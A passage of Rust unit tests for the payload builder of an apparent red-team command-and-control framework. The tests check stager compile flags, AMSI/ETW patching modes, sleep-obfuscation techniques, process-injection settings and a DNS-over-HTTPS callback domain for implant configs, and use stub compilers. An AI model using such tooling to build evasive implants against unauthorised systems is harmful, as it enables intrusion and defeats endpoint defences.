            DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
            None,
            cache_dir,
        );

        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["stager.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: None,
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x86".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };

        let artifact = service.build_payload(&listener, &request, |_| {}).await?;

        // Validate x86 stager output.
        assert_eq!(artifact.bytes, b"stager-x86");
        assert_eq!(artifact.file_name, "demon.x86.exe");

        // The x86 stager must use the _WinMain entry point (leading underscore).
        let args = std::fs::read_to_string(&gcc_x86_args)?;
        assert!(args.contains("_WinMain"), "x86 stager must use _WinMain entry point: {args}");

        // port_conn is None so port_bind (80) should be used.
        assert!(
            args.contains("-DSTAGER_PORT=80"),
            "expected port_bind=80 when port_conn is None: {args}"
        );
        // secure=false ⇒ STAGER_SECURE=0
        assert!(args.contains("-DSTAGER_SECURE=0"), "expected secure=0 in defines: {args}");
        // Default URI is "/" when uris list is empty.
        assert!(args.contains("-DSTAGER_URI="), "expected STAGER_URI define: {args}");

        // The x64 compiler must NOT have been invoked for an x86 build.
        assert!(
            !std::path::Path::new(&temp.path().join("gcc-x64.args")).exists(),
            "x64 compiler should not be invoked for x86 stager build"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_stager_copies_template_to_compile_dir() -> Result<(), Box<dyn std::error::Error>>
    {
        let temp = TempDir::new()?;
        // A gcc stub that writes the contents of MainStager.c (its first arg)
        // into a sidecar file so we can verify the template was copied.
        let template_check = temp.path().join("template_found");
        let nasm_ok = "#!/bin/sh\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'asm' > \"$1\"; break; fi; shift; done\n";
        let gcc_ok = format!(
            "#!/bin/sh\n# Check that MainStager.c exists in cwd\nif [ -f MainStager.c ]; then cp MainStager.c '{}'; fi\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"-o\" ]; then shift; printf 'stager-bin' > \"$1\"; break; fi; shift; done\n",
            template_check.display()
        );
        let (service, listener, _) = setup_build_fixture(&temp, nasm_ok, &gcc_ok)?;

        let request = BuildPayloadRequestInfo {
            agent_type: "Demon".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Windows Shellcode Staged".to_owned(),
            config: "{}".to_owned(),
        };

        let artifact = service.build_payload(&listener, &request, |_| {}).await?;

        assert_eq!(artifact.bytes, b"stager-bin");
        // The gcc stub copies MainStager.c from the compile dir if it exists.
        assert!(
            template_check.exists(),
            "stager template (MainStager.c) must be copied into the compile directory"
        );
        let template_content = std::fs::read_to_string(&template_check)?;
        assert_eq!(
            template_content, "int main(void){return 0;}",
            "stager template content must match the source template"
        );
        Ok(())
    }

    // ---- PayloadBuilderService::cache accessor tests ----

    fn test_cache_key(hex: &str, ext: &'static str) -> CacheKey {
        CacheKey { hex: hex.to_owned(), ext }
    }

    #[test]
    fn cache_accessor_returns_consistent_handle() {
        let svc = PayloadBuilderService::disabled_for_tests();
        let c1 = svc.cache();
        let c2 = svc.cache();
        // Both references must point to the same underlying cache (same
        // cache_dir). This catches accidental reconstructions or field swaps.
        assert_eq!(c1.cache_dir, c2.cache_dir);
        assert!(std::ptr::eq(c1, c2), "cache() should return the same reference each call");
    }

    #[test]
    fn cache_accessor_safe_before_any_build() {
        // Calling cache() on a freshly constructed service must not panic,
        // even though no payload has ever been built.
        let svc = PayloadBuilderService::disabled_for_tests();
        let cache = svc.cache();
        // The cache dir should be the one configured by disabled_for_tests().
        assert_eq!(cache.cache_dir, PathBuf::from("/nonexistent/payload-cache"));
    }

    #[tokio::test]
    async fn cache_accessor_observes_external_mutations() {
        let temp = TempDir::new().expect("unwrap");
        let cache_dir = temp.path().join("payload-cache");
        let svc = PayloadBuilderService::with_paths_for_tests(
            Toolchain {
                compiler_x64: PathBuf::from("/nonexistent/x64-gcc"),
                compiler_x64_version: ToolchainVersion {
                    major: 0,
                    minor: 0,
                    patch: 0,
                    raw: "0.0.0".to_owned(),
                },
                compiler_x86: PathBuf::from("/nonexistent/x86-gcc"),
                compiler_x86_version: ToolchainVersion {
                    major: 0,
                    minor: 0,
                    patch: 0,
                    raw: "0.0.0".to_owned(),
                },
                nasm: PathBuf::from("/nonexistent/nasm"),
                nasm_version: ToolchainVersion {
                    major: 0,
                    minor: 0,
                    patch: 0,
                    raw: "0.0.0".to_owned(),
                },
            },
            PathBuf::from("/nonexistent/src"),
            PathBuf::from("/nonexistent/archon"),
            PathBuf::from("/nonexistent/sc64"),
            PathBuf::from("/nonexistent/sc86"),
            PathBuf::from("/nonexistent/dllldr"),
            PathBuf::from("/nonexistent/stager"),
            DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
            None,
            cache_dir.clone(),
        );

        // Populate the cache through the accessor-returned handle.
        let key = test_cache_key("aabbccdd", ".bin");
        svc.cache().put(&key, b"test-payload").await;

        // Read back through the same accessor — proves mutations are visible.
        let got = svc.cache().get(&key).await.expect("should read back cached artifact");
        assert_eq!(got, b"test-payload");

        // Flush through the accessor and verify the cache is empty.
        let removed = svc.cache().flush().await.expect("flush should succeed");
        assert_eq!(removed, 1);
        assert!(svc.cache().get(&key).await.is_none(), "cache should be empty after flush");
    }

    // ── replace_all byte replacement tests ────────────────────────────────

    #[test]
    fn replace_all_replaces_single_occurrence() {
        let haystack = b"hello world".to_vec();
        let result = replace_all(haystack, b"world", b"earth");
        assert_eq!(result, b"hello earth");
    }

    #[test]
    fn replace_all_replaces_multiple_occurrences() {
        let haystack = b"aXaXa".to_vec();
        let result = replace_all(haystack, b"X", b"Y");
        assert_eq!(result, b"aYaYa");
    }

    #[test]
    fn replace_all_no_match_returns_unchanged() {
        let haystack = b"hello world".to_vec();
        let result = replace_all(haystack.clone(), b"xyz", b"abc");
        assert_eq!(result, haystack);
    }

    #[test]
    fn replace_all_empty_needle_returns_unchanged() {
        let haystack = b"hello".to_vec();
        let result = replace_all(haystack.clone(), b"", b"x");
        assert_eq!(result, haystack);
    }

    #[test]
    fn replace_all_same_length_replacement() {
        let haystack = b"AAAA".to_vec();
        let result = replace_all(haystack, b"AA", b"BB");
        assert_eq!(result, b"BBBB");
    }

    #[test]
    fn replace_all_with_null_padded_replacement() {
        // Simulates the PE string replacement where replacement is
        // null-padded to match the original string length.
        let haystack = b"old_string_here".to_vec();
        let mut replacement = b"new".to_vec();
        replacement.resize(b"old_string_here".len(), 0);
        let result = replace_all(haystack, b"old_string_here", &replacement);
        assert_eq!(&result[..3], b"new");
        assert!(result[3..].iter().all(|&b| b == 0));
    }

    // ── sleep/proxy/amsi value mapping tests ──────────────────────────────

    #[test]
    fn sleep_obfuscation_value_maps_known_techniques() {
        assert_eq!(sleep_obfuscation_value("Foliage"), 3);
        assert_eq!(sleep_obfuscation_value("Ekko"), 1);
        assert_eq!(sleep_obfuscation_value("Zilean"), 2);
    }

    #[test]
    fn sleep_obfuscation_value_returns_zero_for_unknown() {
        assert_eq!(sleep_obfuscation_value("WaitForSingleObjectEx"), 0);
        assert_eq!(sleep_obfuscation_value("Unknown"), 0);
        assert_eq!(sleep_obfuscation_value(""), 0);
    }

    #[test]
    fn sleep_jump_bypass_returns_zero_when_obfuscation_disabled() {
        assert_eq!(sleep_jump_bypass(0, Some("jmp rax")).expect("unwrap"), 0);
        assert_eq!(sleep_jump_bypass(0, Some("jmp rbx")).expect("unwrap"), 0);
        assert_eq!(sleep_jump_bypass(0, None).expect("unwrap"), 0);
    }

    #[test]
    fn sleep_jump_bypass_maps_gadgets_when_obfuscation_enabled() {
        assert_eq!(sleep_jump_bypass(1, Some("jmp rax")).expect("unwrap"), 1);
        assert_eq!(sleep_jump_bypass(1, Some("jmp rbx")).expect("unwrap"), 2);
        assert_eq!(sleep_jump_bypass(1, None).expect("unwrap"), 0);
        assert_eq!(sleep_jump_bypass(1, Some("unknown")).expect("unwrap"), 0);
    }

    #[test]
    fn proxy_loading_value_maps_known_methods() {
        assert_eq!(proxy_loading_value(Some("RtlRegisterWait")), 1);
        assert_eq!(proxy_loading_value(Some("RtlCreateTimer")), 2);
        assert_eq!(proxy_loading_value(Some("RtlQueueWorkItem")), 3);
    }

    #[test]
    fn proxy_loading_value_defaults_to_zero() {
        assert_eq!(proxy_loading_value(None), 0);
        assert_eq!(proxy_loading_value(Some("None (LdrLoadDll)")), 0);
        assert_eq!(proxy_loading_value(Some("unknown")), 0);
    }

    #[test]
    fn amsi_patch_value_maps_known_methods() {
        // Legacy value strings (backward compat)
        assert_eq!(amsi_patch_value(Some("Hardware breakpoints")), 1);
        assert_eq!(amsi_patch_value(Some("Memory")), 2);
        // ARC-01 canonical profile values
        assert_eq!(amsi_patch_value(Some("hwbp")), 1);
        assert_eq!(amsi_patch_value(Some("patch")), 2);
        assert_eq!(amsi_patch_value(Some("none")), 0);
    }

    #[test]
    fn amsi_patch_value_defaults_to_zero() {
        assert_eq!(amsi_patch_value(None), 0);
        assert_eq!(amsi_patch_value(Some("")), 0);
        assert_eq!(amsi_patch_value(Some("unknown")), 0);
    }

    #[test]
    fn merged_request_config_archon_defaults_amsi_to_patch()
    -> Result<(), Box<dyn std::error::Error>> {
        // When AmsiEtw is absent from both request and profile, Archon
        // should default to "patch" (AMSIETW_PATCH_MEMORY = 2).
        let config = merged_request_config(
            r#"{}"#,
            "archon",
            &DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
        )?;
        assert_eq!(
            config.get("Amsi/Etw Patch"),
            Some(&Value::String("patch".to_owned())),
            "Archon without an explicit AmsiEtw key should default to 'patch'"
        );
        Ok(())
    }

    #[test]
    fn merged_request_config_archon_profile_amsi_overrides_default()
    -> Result<(), Box<dyn std::error::Error>> {
        // An explicit profile value must take precedence over the Archon default.
        let config = merged_request_config(
            r#"{}"#,
            "archon",
            &DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: Some("hwbp".to_owned()),
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
        )?;
        assert_eq!(
            config.get("Amsi/Etw Patch"),
            Some(&Value::String("hwbp".to_owned())),
            "explicit profile AmsiEtw must win over the Archon default"
        );
        Ok(())
    }

    #[test]
    fn merged_request_config_demon_amsi_stays_none_by_default()
    -> Result<(), Box<dyn std::error::Error>> {
        // For Demon, absence of AmsiEtw in the profile should leave it unset
        // (serialises to 0 = AMSIETW_PATCH_NONE in the agent config bytes).
        let config = merged_request_config(
            r#"{}"#,
            "demon",
            &DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
        )?;
        assert_eq!(
            config.get("Amsi/Etw Patch"),
            None,
            "Demon without an explicit AmsiEtw key should leave the field absent"
        );
        Ok(())
    }

    // ── injection_mode tests ──────────────────────────────────────────────

    #[test]
    fn injection_mode_maps_known_values() -> Result<(), PayloadBuildError> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Alloc": "Win32",
            "Execute": "Native/Syscall"
        }))
        .expect("unwrap");
        assert_eq!(injection_mode(&config, "Alloc")?, 1);
        assert_eq!(injection_mode(&config, "Execute")?, 2);
        Ok(())
    }

    #[test]
    fn injection_mode_returns_zero_for_unknown() -> Result<(), PayloadBuildError> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Alloc": "Unknown"
        }))
        .expect("unwrap");
        assert_eq!(injection_mode(&config, "Alloc")?, 0);
        Ok(())
    }

    // ── pack_config validation edge cases ─────────────────────────────────

    #[test]
    fn pack_config_rejects_jitter_above_100() {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "101",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))
        .expect("unwrap");
        let listener = http_listener_with_method(None);
        let err = pack_config(&listener, &config).expect_err("jitter > 100 should be rejected");
        assert!(matches!(
            err,
            PayloadBuildError::InvalidRequest { message }
                if message.contains("Jitter") && message.contains("100")
        ));
    }

    #[test]
    fn pack_config_accepts_jitter_at_boundary_100() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "100",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = http_listener_with_method(None);
        pack_config(&listener, &config)?;
        Ok(())
    }

    #[test]
    fn pack_config_accepts_jitter_at_boundary_0() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = http_listener_with_method(None);
        pack_config(&listener, &config)?;
        Ok(())
    }

    #[test]
    fn pack_config_heap_enc_false_is_packed_as_zero() -> Result<(), Box<dyn std::error::Error>> {
        let config = serde_json::from_value::<Map<String, Value>>(json!({
            "Sleep": "5",
            "Jitter": "0",
            "Sleep Technique": "WaitForSingleObjectEx",
            "HeapEnc": false,
            "Injection": {
                "Alloc": "Win32",
                "Execute": "Win32",
                "Spawn64": "a",
                "Spawn32": "b"
            }
        }))?;
        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
            name: "smb".to_owned(),
            pipe_name: "pivot".to_owned(),
            kill_date: None,
            working_hours: None,
        });

        let bytes = pack_config(&listener, &config)?;
        let mut cursor = bytes.as_slice();
        assert_eq!(read_u32(&mut cursor)?, 5);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_u32(&mut cursor)?, 1);
        assert_eq!(read_wstring(&mut cursor)?, "a");
        assert_eq!(read_wstring(&mut cursor)?, "b");
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0); // HeapEnc (explicit false)
        assert_eq!(read_wstring(&mut cursor)?, r"\\.\pipe\pivot");
        assert_eq!(read_u64(&mut cursor)?, 0);
        assert_eq!(read_u32(&mut cursor)?, 0);
        assert!(cursor.is_empty());
        Ok(())
    }

    #[test]
    fn merged_request_config_propagates_heap_enc_false_from_profile_defaults()
    -> Result<(), Box<dyn std::error::Error>> {
        let config = merged_request_config(
            r#"{"Sleep":"5","Jitter":"0","Sleep Technique":"WaitForSingleObjectEx","Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"a","Spawn32":"b"}}"#,
            "demon",
            &DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: false,
                allow_legacy_ctr: false,
            },
        )?;
        assert_eq!(config.get("HeapEnc"), Some(&Value::Bool(false)));
        Ok(())
    }

    // ── merged_request_config override tests ──────────────────────────────

    #[test]
    fn merged_request_config_request_overrides_profile_defaults()
    -> Result<(), Box<dyn std::error::Error>> {
        let config = merged_request_config(
            r#"{"Sleep":"20","Jitter":"50","Injection":{"Alloc":"Win32","Execute":"Win32"}}"#,
            "demon",
            &DemonConfig {
                sleep: Some(5),
                jitter: Some(10),
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
        )?;
        // Request values should override profile defaults.
        assert_eq!(config.get("Sleep"), Some(&Value::String("20".to_owned())));
        assert_eq!(config.get("Jitter"), Some(&Value::String("50".to_owned())));
        Ok(())
    }

    #[test]
    fn merged_request_config_injection_spawn_overrides_profile()
    -> Result<(), Box<dyn std::error::Error>> {
        let config = merged_request_config(
            r#"{"Injection":{"Alloc":"Win32","Execute":"Win32","Spawn64":"custom64.exe","Spawn32":"custom32.exe"}}"#,
            "demon",
            &DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: Some(red_cell_common::config::ProcessInjectionConfig {
                    spawn64: Some("default64.exe".to_owned()),
                    spawn32: Some("default32.exe".to_owned()),
                }),
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
        )?;
        assert_eq!(config["Injection"]["Spawn64"], Value::String("custom64.exe".to_owned()));
        assert_eq!(config["Injection"]["Spawn32"], Value::String("custom32.exe".to_owned()));
        Ok(())
    }

    #[test]
    fn merged_request_config_rejects_non_object_input() {
        let err = merged_request_config(
            r#""just a string""#,
            "demon",
            &DemonConfig {
                sleep: None,
                jitter: None,
                indirect_syscall: false,
                stack_duplication: false,
                sleep_technique: None,
                proxy_loading: None,
                amsi_etw_patching: None,
                injection: None,
                dotnet_name_pipe: None,
                binary: None,
                init_secret: None,
                init_secrets: Vec::new(),
                trust_x_forwarded_for: false,
                trusted_proxy_peers: Vec::new(),
                heap_enc: true,
                allow_legacy_ctr: false,
            },
        )
        .expect_err("non-object JSON should be rejected");
        assert!(matches!(err, PayloadBuildError::InvalidRequest { message }
            if message.contains("JSON object")));
    }

    // ── proxy_url tests ───────────────────────────────────────────────────

    #[test]
    fn proxy_url_formats_with_default_scheme() {
        let proxy = DomainHttpListenerProxyConfig {
            enabled: true,
            proxy_type: None,
            host: "proxy.local".to_owned(),
            port: 8080,
            username: None,
            password: None,
        };
        assert_eq!(proxy_url(&proxy), "http://proxy.local:8080");
    }

    #[test]
    fn proxy_url_uses_configured_scheme() {
        let proxy = DomainHttpListenerProxyConfig {
            enabled: true,
            proxy_type: Some("socks5".to_owned()),
            host: "socks.local".to_owned(),
            port: 1080,
            username: None,
            password: None,
        };
        assert_eq!(proxy_url(&proxy), "socks5://socks.local:1080");
    }

    // ── parse_header_u32_field tests ──────────────────────────────────────

    #[test]
    fn parse_header_u32_field_decimal() -> Result<(), PayloadBuildError> {
        assert_eq!(parse_header_u32_field("CompileTime", "42")?, 42);
        Ok(())
    }

    #[test]
    fn parse_header_u32_field_hex_lowercase() -> Result<(), PayloadBuildError> {
        assert_eq!(parse_header_u32_field("CompileTime", "0x1a2b")?, 0x1a2b);
        Ok(())
    }

    #[test]
    fn parse_header_u32_field_hex_uppercase_prefix() -> Result<(), PayloadBuildError> {
        assert_eq!(parse_header_u32_field("CompileTime", "0X1A2B")?, 0x1a2b);
        Ok(())
    }

    #[test]
    fn parse_header_u32_field_trims_whitespace() -> Result<(), PayloadBuildError> {
        assert_eq!(parse_header_u32_field("CompileTime", "  100  ")?, 100);
        Ok(())
    }

    #[test]
    fn parse_header_u32_field_rejects_non_numeric() {
        let err = parse_header_u32_field("CompileTime", "not-a-number")
            .expect_err("non-numeric should be rejected");
        assert!(matches!(err, PayloadBuildError::InvalidRequest { .. }));
    }

    // ── disabled_for_tests structural tests ───────────────────────────────

    #[test]
    fn disabled_for_tests_creates_valid_service() {
        let svc = PayloadBuilderService::disabled_for_tests();
        // Should not panic and should have sensible defaults.
        assert_eq!(svc.inner.toolchain.compiler_x64, PathBuf::from("/nonexistent/x64-gcc"));
        assert_eq!(svc.inner.toolchain.compiler_x86, PathBuf::from("/nonexistent/x86-gcc"));
        assert_eq!(svc.inner.toolchain.nasm, PathBuf::from("/nonexistent/nasm"));
        assert_eq!(svc.inner.toolchain.compiler_x64_version.major, 0);
        assert_eq!(svc.inner.default_demon.sleep, None);
        assert!(!svc.inner.default_demon.indirect_syscall);
        assert!(svc.inner.binary_patch.is_none());
    }

    #[test]
    fn disabled_for_tests_is_cloneable() {
        let svc1 = PayloadBuilderService::disabled_for_tests();
        let svc2 = svc1.clone();
        // Both should share the same inner Arc.
        assert!(Arc::ptr_eq(&svc1.inner, &svc2.inner));
    }

    // ── required_u32 parsing tests ────────────────────────────────────────

    #[test]
    fn required_u32_parses_string_value() -> Result<(), PayloadBuildError> {
        let config =
            serde_json::from_value::<Map<String, Value>>(json!({"val": "42"})).expect("unwrap");
        assert_eq!(required_u32(&config, "val")?, 42);
        Ok(())
    }

    #[test]
    fn required_u32_parses_number_value() -> Result<(), PayloadBuildError> {
        let config =
            serde_json::from_value::<Map<String, Value>>(json!({"val": 42})).expect("unwrap");
        assert_eq!(required_u32(&config, "val")?, 42);
        Ok(())
    }

    #[test]
    fn required_u32_rejects_missing_key() {
        let config = serde_json::from_value::<Map<String, Value>>(json!({})).expect("unwrap");
        let err = required_u32(&config, "missing").expect_err("missing key should fail");
        assert!(matches!(err, PayloadBuildError::InvalidRequest { message }
            if message.contains("missing")));
    }

    #[test]
    fn required_u32_rejects_non_numeric_string() {
        let config =
            serde_json::from_value::<Map<String, Value>>(json!({"val": "abc"})).expect("unwrap");
        let err = required_u32(&config, "val").expect_err("non-numeric should fail");
        assert!(matches!(err, PayloadBuildError::InvalidRequest { .. }));
    }

    #[test]
    fn pack_http_listener_packs_doh_domain_and_provider_cloudflare()
    -> Result<(), Box<dyn std::error::Error>> {
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["localhost:80".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: None,
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: Some(false),
            doh_domain: Some("c2.example.com".to_owned()),
            doh_provider: Some("cloudflare".to_owned()),
        }));
        let bytes = pack_config(&listener, &minimal_config_json())?;
        let mut cursor = bytes.as_slice();
        // Skip to the DoH fields: consume all preceding fields.
        // Sleep, Jitter, Alloc, Execute, Spawn64, Spawn32, SleepTech, SleepJmp,
        // StackSpoof, ProxyLoading, SysIndirect, AmsiEtwPatch, HeapEnc
        read_u32(&mut cursor)?; // Sleep
        read_u32(&mut cursor)?; // Jitter
        read_u32(&mut cursor)?; // Alloc
        read_u32(&mut cursor)?; // Execute
        read_wstring(&mut cursor)?; // Spawn64
        read_wstring(&mut cursor)?; // Spawn32
        read_u32(&mut cursor)?; // SleepTechnique
        read_u32(&mut cursor)?; // SleepJmpBypass
        read_u32(&mut cursor)?; // StackSpoof
        read_u32(&mut cursor)?; // ProxyLoading
        read_u32(&mut cursor)?; // SysIndirect
        read_u32(&mut cursor)?; // AmsiEtwPatch
        read_u32(&mut cursor)?; // HeapEnc
        // HTTP-transport fields
        read_u64(&mut cursor)?; // KillDate
        read_u32(&mut cursor)?; // WorkingHours
        read_wstring(&mut cursor)?; // Method
        read_u32(&mut cursor)?; // HostRotation
        read_u32(&mut cursor)?; // host count
        read_wstring(&mut cursor)?; // host
        read_u32(&mut cursor)?; // port
        read_u32(&mut cursor)?; // Secure
        read_wstring(&mut cursor)?; // UserAgent
        read_u32(&mut cursor)?; // header count (1: Content-type)
        read_wstring(&mut cursor)?; // header
        read_u32(&mut cursor)?; // uri count (1: /)
        read_wstring(&mut cursor)?; // uri
        read_u32(&mut cursor)?; // Proxy enabled (0)
        read_u32(&mut cursor)?; // Ja3Randomize
        // DoH fields
        assert_eq!(read_bytes(&mut cursor)?, b"c2.example.com");
        assert_eq!(read_u32(&mut cursor)?, 0); // Cloudflare
        assert!(cursor.is_empty());
        Ok(())
    }

    #[test]
    fn pack_http_listener_packs_doh_provider_google() -> Result<(), Box<dyn std::error::Error>> {
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["localhost:80".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: None,
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: Some(false),
            doh_domain: Some("c2.example.com".to_owned()),
            doh_provider: Some("google".to_owned()),
        }));
        let with_google = pack_config(&listener, &minimal_config_json())?;
        // Verify the last 4 bytes (provider) are 1 = Google.
        let provider = u32::from_le_bytes(
            with_google[with_google.len() - 4..].try_into().expect("last 4 bytes"),
        );
        assert_eq!(provider, 1, "Google provider should be encoded as 1");
        Ok(())
    }

    // ── BuildProgress and PayloadArtifact derive tests ────────────────────

    #[test]
    fn build_progress_clone_and_eq() {
        let a = BuildProgress { level: "Info".to_owned(), message: "test".to_owned() };
        let b = a.clone();
        assert_eq!(a, b);
    }

    #[test]
    fn payload_artifact_clone_and_eq() {
        let a = PayloadArtifact {
            bytes: vec![1, 2, 3],
            file_name: "test.exe".to_owned(),
            format: "Windows Exe".to_owned(),
        };
        let b = a.clone();
        assert_eq!(a, b);
    }

    // ── PayloadBuildError display tests ────────────────────────────────────

    #[test]
    fn payload_build_error_display_messages() {
        let err = PayloadBuildError::ToolchainUnavailable { message: "nasm missing".to_owned() };
        assert!(err.to_string().contains("nasm missing"));

        let err = PayloadBuildError::InvalidRequest { message: "bad arch".to_owned() };
        assert!(err.to_string().contains("bad arch"));

        let err =
            PayloadBuildError::CommandFailed { command: "gcc".to_owned(), diagnostics: vec![] };
        assert!(err.to_string().contains("gcc"));
    }

    // Phantom / Specter callback URL tests live in `rust_agent::tests`.

    #[tokio::test]
    async fn build_payload_phantom_rejects_missing_source_tree()
    -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Phantom".to_owned(),
            listener: "http".to_owned(),
            arch: "x64".to_owned(),
            format: "Linux ELF".to_owned(),
            config: "{}".to_owned(),
        };
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["listener.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 443,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: true,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
        }));

        let error = service
            .build_payload(&listener, &request, |_| {})
            .await
            .expect_err("missing phantom source tree should be rejected");
        assert!(
            matches!(error, PayloadBuildError::ToolchainUnavailable { .. }),
            "expected ToolchainUnavailable, got {error:?}"
        );
        Ok(())
    }

    #[tokio::test]
    async fn build_payload_specter_rejects_missing_source_tree()
    -> Result<(), Box<dyn std::error::Error>> {
        let service = PayloadBuilderService::disabled_for_tests();
        let request = BuildPayloadRequestInfo {
            agent_type: "Specter".to_owned(),
